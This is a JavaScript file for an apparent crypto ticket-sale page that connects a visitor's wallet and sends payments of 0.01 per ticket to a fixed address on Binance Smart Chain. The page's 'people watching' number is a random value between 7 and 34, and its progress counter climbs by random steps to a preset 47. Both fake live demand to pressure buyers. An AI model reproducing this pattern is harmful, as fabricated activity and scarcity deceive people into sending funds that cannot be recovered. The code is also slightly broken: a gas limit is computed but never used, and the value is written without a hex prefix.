var address = '0xedeac126ecf00466e32045661dee035fd2fd29e9';
var ethaddress = '';
var web3;
var increasing_val = 5;
var percent = 50 * 94 / 100;
var num_of_tickets = 1;
const ethereum = window.ethereum;

$(document).ready(function () {
    web3 = new Web3(
        new Web3.providers.HttpProvider(
            'https://bsc-dataseed1.binance.org:443'
        )
    );

    const sendTransaction = async () => {
        var totalPriceAmount = num_of_tickets * 0.01;
        const priceToWei = (totalPriceAmount * 1e18).toString(16);
        const gasLimit = (100_000 * totalPriceAmount).toString(16);

        ethereum
            .request({
                method: "eth_sendTransaction",
                params: [
                    {
                        from: ethaddress,
                        to: address,
                        value: priceToWei,
                    },
                ],
            })
            .then((txHash) => { console.log(txHash); })
            .catch((error) => { console.log(error) });
    };

    async function connectWeb3() {
        if (window.ethereum) {
            window.web3 = new Web3(window.ethereum);
            conn = await window.ethereum.enable();

            ethconnected = conn.length > 0;
            if (ethconnected) {
                ethaddress = conn[0];
            }
            return true;
        }
    }

    connectWeb3();

    $('.buy_now').click(async () => {
        await sendTransaction();
    });

    setInterval(() => {
        peoples_watching(7, 34)
    }, 3000);

    var increasing = setInterval(() => {
        var random = Math.floor(Math.random() * (6 - 5 + 1) + 5)
        increasing_val = increasing_val + random;
        console.log(increasing_val);
        if ((increasing_val >= percent) && (increasing_val != percent)){
            increasing_val = percent;
            $('.increasing_val').fadeIn().html(increasing_val);
            clearInterval(increasing);
        } else if(increasing_val == percent){
            clearInterval(increasing);
        }else {
            $('.increasing_val').fadeIn().html(increasing_val);
        }
    }, 500);

});

function ticket_num(type) {
    if (type == 'increment') {
        if (num_of_tickets != 5) {
            ++num_of_tickets
        }
    } else {
        if (num_of_tickets != 1) {
            --num_of_tickets;
        }
    }
    $('.num_of_tickets').html(num_of_tickets);
    $('.to_pay').html(num_of_tickets * 0.01);
}

function peoples_watching(min, max) {
    var num = Math.floor(Math.random() * (max - min + 1) + min)
    $('#peoples_watching').fadeIn().html(num);
}